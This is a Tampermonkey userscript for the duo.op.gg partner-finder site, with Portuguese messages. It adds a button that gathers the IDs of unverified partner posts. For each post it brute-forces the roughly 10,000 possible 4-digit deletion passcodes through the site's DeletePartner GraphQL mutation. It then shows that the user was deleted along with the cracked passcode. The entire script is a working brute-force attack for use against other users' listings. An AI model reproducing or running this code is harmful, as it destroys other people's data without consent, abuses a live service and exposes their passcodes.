// ==UserScript==
// @name         Duo.gg
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  op.gg
// @author       You
// @match        *://duo.op.gg/*/lol/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=op.gg
// @grant        GM_log
// @grant        GM_addStyle
// @require      http://code.jquery.com/jquery-latest.js
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @require      https://cdn.jsdelivr.net/npm/sweetalert2@11
// @require      https://use.fontawesome.com/0ded963fd5.js
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

//--- Style our newly added elements using CSS.
GM_addStyle ( `
    #myContainer {
        position:               absolute;
        top:                    0;
        left:                   0;
        font-size:              20px;
        background:             #302c34;
        border:                 3px outset black;
        margin:                 5px;
        opacity:                0.9;
        z-index:                1100;
        padding:                5px 20px;
    }
    #myButton {
        cursor:                 pointer;
    }
    #myContainer p {
        color:                  red;
        background:             white;
    }
    #myContainer{
        transform:translatex(803px) translatey(92px);
    }
` );

const Toast = Swal.mixin({
    toast: true,
    position: 'top-end',
    showConfirmButton: false,
    timer: 6000,
    timerProgressBar: true,
    didOpen: (toast) => {
        toast.addEventListener('mouseenter', Swal.stopTimer)
        toast.addEventListener('mouseleave', Swal.resumeTimer)
    }
})

$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.i.max-w-full.min-w-0.tems-center.sm\\:flex-col.sm\\:items-start > div > div.relative").remove()
$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.max-w-full.min-w-0.lg\\:space-x-2.sm\\:flex-col-reverse.sm\\:items-end.relative > div.flex > button").remove()
$("#duo-container > div > section > div.flex.justify-between.items-start.lg\\:items-center > div.flex.max-w-full.min-w-0.lg\\:space-x-2.sm\\:flex-col-reverse.sm\\:items-end.relative > div.flex").append("<button id='myButton' class='rounded text-bold py-2.5 px-5 sm:px-4 sm:py-3.5 sm:text-3xs whitespace-nowrap text-white cursor-pointer' style='background-color: #e84057'><i class='fa fa-bomb' aria-hidden='true'></i></button>")

document.getElementById ("myButton").addEventListener (
    "click", ButtonClickAction, false
);

async function ButtonClickAction (zEvent) {
    $('.opgg-gnb-app').removeAttr('style');
    $('#myButton').css('background-color','#424254').prop("disabled",true);

    await Toast.fire({
        icon: 'warning',
        title: 'Iniciando a remoção...'
    })

    wipeDay();
}


function hasConsecutiveSequences(str) {
  for (let i = 0; i < str.length - 3; i++) {
    const sequence = str.slice(i, i + 4);
    if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
      return true;
    }
  }
  return false;
}

function hasRepeatingNumbers(str) {
  for (let i = 0; i < str.length - 2; i++) {
    if (str[i] === str[i + 1] && str[i] === str[i + 2]) {
      return true;
    }
  }
  return false;
}

const numbersArray = [];

for (let i = 0; i <= 9999; i++) {
  const paddedNumber = i.toString().padStart(4, '0');
  if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
    numbersArray.push(paddedNumber);
  }
}

var senhas = numbersArray;
var i;

async function wipeDay(){
    var c4 = [];

    var y = 0;
    const divs = document.querySelectorAll('[id^="partner-"].flex.items-center');
    const filteredDivs = Array.from(divs).filter(div => !div.textContent.includes("Verificado"));
    const numbers = Array.from(filteredDivs).map(div => div.id.match(/\d+/)[0]);
    const uniqueNumbers = [...new Set(numbers)];

    for(y = 0; y < uniqueNumbers.length; y++){
      i = 0;
      let name = $(`#partner-${uniqueNumbers[y]} > div > div > div > a`).text();
      Toast.fire({
          icon: 'info',
          title: 'Deletando o usuario: ' + name
      })
      var res = await httpRequest(uniqueNumbers[y], name);
      //console.log(res);
      c4.push(res);
    }

    $('#myButton').css('background-color','#e84057').prop("disabled",false);

    //console.clear();
    //console.log(c4);
}

async function httpRequest(id, name) {

  var found = false;
   //console.clear();
   //console.log('Processando... id: ' + id)
   $(`#partner-${id}`).css('background-color','#e84057');

   while(found == false){

       let kboom = await TheBomb(id,senhas[i])

       if(kboom == false){
         if(i <= senhas.length){
          i++;
          // console.clear();
          //console.log('Senhas testadas: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
         } else {
           found = true;
         }
       } else if (kboom == true) {
         //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
         Toast.fire({
             icon: 'success',
             title: 'Usuario deletado: ' + name + ', Id:' + id + ', senha: ' + senhas[i]
         })
         return {
                  'Id': id,
                  'Senha':senhas[i]
                }
       } else {
         await httpRequest(id);
       }
       found = kboom;
   }
}

async function TheBomb(id,pass){

    return fetch("https://duo.op.gg/graphql", {
      method: "POST",
      body: JSON.stringify( {
        "operationName": "DeletePartner",
        "variables": {
        "id": id,
        "passcode": pass
        },
        "query": "mutation DeletePartner($id: ID!, $passcode: String) {\n  deletePartner(id: $id, passcode: $passcode) {\n    id\n    __typename\n  }\n}"
      }),
      headers: { "Content-type" : "application/json" }
    }).then(response => response.json())
      .then(data => {
          //console.log(data)
          if(data.data != null){
            return true;
        } else {
            return false;
        }

      })
      .catch (e => {
        console.log(e)
        TheBomb(id,pass)
      })


}


})();